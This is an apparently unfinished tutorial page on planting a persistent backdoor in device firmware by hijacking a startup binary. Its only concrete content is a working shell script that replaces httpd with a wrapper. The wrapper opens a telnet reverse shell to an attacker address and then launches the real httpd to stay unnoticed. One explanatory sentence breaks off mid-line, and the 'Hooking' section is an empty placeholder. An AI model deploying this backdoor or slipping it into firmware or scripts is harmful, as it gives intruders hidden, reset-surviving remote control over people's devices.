# Firmare backdoor

In this section, I will discuss the methods to install a backdoor in a firmware. This means to modify the behavior of the firmware to insert custom logic to gain **persistence** on the device. The modified firmware will then be flashed back on the hardware.

For example, we can hijack a startup binary (called on device boot) to insert custom commands to initiate a reverse shell to a remote attacker server. Since it is baked into the device's firmware, it will remain persistent on the device even across factory reset or power cycles (turning ON and OFF the power).

## 1. Startup binary hijacking

This technique



{% code overflow="wrap" %}
```sh
#!/bin/sh

# TELNET REVERSE SHELL
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh 2>&1 | /usr/bin/telnet 192.168.1.118 8888 > /tmp/f &

# EXECUTE ORIGINAL 'httpd' BINARY
/usr/sbin/httpd.real &
```
{% endcode %}

## 2. Hooking

coming ...
